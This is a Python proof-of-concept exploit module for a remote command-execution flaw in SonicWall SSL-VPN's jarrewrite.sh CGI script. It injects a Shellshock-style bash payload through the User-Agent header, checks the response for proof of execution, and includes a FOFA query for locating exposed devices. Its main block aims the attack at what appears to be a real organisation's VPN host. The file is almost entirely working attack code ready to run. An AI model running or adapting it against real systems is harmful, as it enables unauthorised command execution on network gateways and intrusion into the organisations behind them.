# coding:utf-8
import requests
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'SonicWall SSL-VPN jarrewrite.sh RCE'
		self.vulsystem= 'SonicWall SSL-VPN'
		self.vulsystemintro = 'SonicWall是硬件防火墙设备，VPN网关和网络安全解决方案的知名制造商，其产品通常用于SMB/SME和大型企业组织。'\
		'SonicWALL 的SSL VPN NetExtender 功能是一种用于Windows、Mac 和Linux 用户的客户端应用程序，支持远程用户安全连接到远程网络。'\
		'NetExtender VPN客户端版本10系列（于2020年发布）'
		self.vulversion = 'NetExtender VPN client:version 10.x ;Secure Mobile Access:version 10.x'
		self.fofa='((body="login_box_sonicwall" || header="SonicWALL SSL-VPN Web Server") && body="SSL-VPN")'
		self.findtime='2021-01'
		self.cveid=''
		self.refer= 'https://xz.aliyun.com/t/9143?page=1\nhttps://nosec.org/home/detail/4662.html\nhttps://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/\nhttps://github.com/darrenmartyn/visualdoor\nhttps://mp.weixin.qq.com/s/kGlcDkpAd3B8-RhZE63lUw'
		self.bbb='该漏洞是由于Sonicwall SSL-VPN引入旧版本的Linux内核，'\
		'其处理HTTP的CGI未过滤HTTP header，导致远程攻击者可以构造恶意的'\
		'http报文注入系统命令，成功利用该漏洞可以在受影响设备获得nobody用'\
		'户权限并执行任意命令，可能再次利用旧版本Linux内核漏洞进行提升权'\
		'限最终实现完全控制服务器'
		self.testisok=True

		self.vulpath='/cgi-bin/jarrewrite.sh'	
		self.payload='''() { :;};echo;/bin/bash -c "echo -n 'hello'|md5sum"''' # ) { :的两个空格是必须的，删除的话请求将会报错
		self.headers={'User-Agent':self.payload}
		self.flag = 200
		self.flag1 = '5d41402abc4b2a76b9719d911017c592'


	def c2Func(self,target):
		status=0
		returnData=''

		# 1、处理目标格式
		if target.startswith(('http://','https://')):
			target=target+'/'
			target=target[:target.find('/',8)] #
		else:
			target='https://'+target
		try:
			# 2、准备攻击所需的数据
			url=target.strip('/')+self.vulpath
			# 3、开始攻击
			resp=requests.get(url=url,headers=self.headers,verify=False,timeout=30)
			# 4、检测是否存在成功标识
			if self.flag == resp.status_code and self.flag1 in resp.text:
				status=1
				returnData='%s is vuln(%s) , vulpath: %s'\
				''%(target.strip('/'),self.vulname,url)
		except Exception as e:
			# print(e)
			returnData=str(e)
		# 5、返回状态与数据
		return status,returnData

if __name__ == '__main__':
	target='https://sslvpn.cgemc.com/'
	pocObj=c2Class()
	print(pocObj.c2Func(target))